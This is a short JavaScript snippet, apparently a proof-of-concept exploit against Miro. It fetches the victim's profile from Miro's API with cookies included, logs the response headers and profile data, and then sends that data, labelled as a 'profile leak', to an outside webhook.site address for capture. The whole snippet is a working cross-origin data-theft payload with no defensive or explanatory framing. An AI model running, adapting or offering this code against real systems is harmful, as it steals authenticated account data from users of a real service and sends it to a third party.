(function () {
  fetch("https://miro.com/api/v1/profile/", {
    method: "GET",
    credentials: "include" // Ensures cookies are included if allowed
  })
    .then(res => {
      console.log("Response Status:", res.status);
      for (let [key, value] of res.headers.entries()) {
        console.log(`Response Header: ${key} → ${value}`);
      }
      return res.json();
    })
    .then(profileData => {
      console.log("Profile Data:", profileData);

      // Optional: Send to your webhook endpoint for capture
      fetch("https://webhook.site/6f357c7b-0aa6-435d-b9d6-24b85f931aea", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ miro_profile_leak: profileData })
      });
    })
    .catch(err => console.error("Fetch failed or CORS blocked:", err));
})();
